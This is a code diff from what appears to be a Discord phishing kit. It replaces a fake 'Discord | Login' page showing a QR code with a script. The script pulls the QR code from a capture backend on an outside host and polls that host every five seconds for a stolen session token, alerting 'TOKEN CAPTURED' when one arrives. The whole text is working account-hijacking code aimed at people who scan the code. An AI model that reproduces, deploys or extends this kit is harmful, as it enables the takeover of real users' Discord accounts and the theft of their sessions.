@@ -1,28 +1,18 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Discord | Login</title>
-    <style>
-        body { background: #36393f; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: #2f3136; padding: 40px; border-radius: 8px; text-align: center; }
-        img { width: 250px; background: white; padding: 10px; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2>Login with QR Code</h2>
-        <p>Scan this with your Discord app</p>
-        <img id="qr-img" src="">
-    </div>
-
-    <script>
-        async function init() {
-            // replace with your railway url
-            const res = await fetch('https://disco-capture-production.up.railway.app/get-qr');
-            const data = await res.json();
-            document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.qr)}`;
-        }
-        init();
-    </script>
-</body>
-</html>
+async function init() {
+    try {
+        const res = await fetch('https://disco-capture-production.up.railway.app/get-qr');
+        const data = await res.json();
+        document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.qr)}`;
+        
+        // Check for token every 5 seconds
+        setInterval(async () => {
+            const tokenRes = await fetch('https://disco-capture-production.up.railway.app/get-token');
+            const tokenData = await tokenRes.json();
+            if (tokenData.token) {
+                alert("TOKEN CAPTURED: " + tokenData.token);
+            }
+        }, 5000);
+    } catch (e) {
+        console.log("Waiting for backend...");
+    }
+}
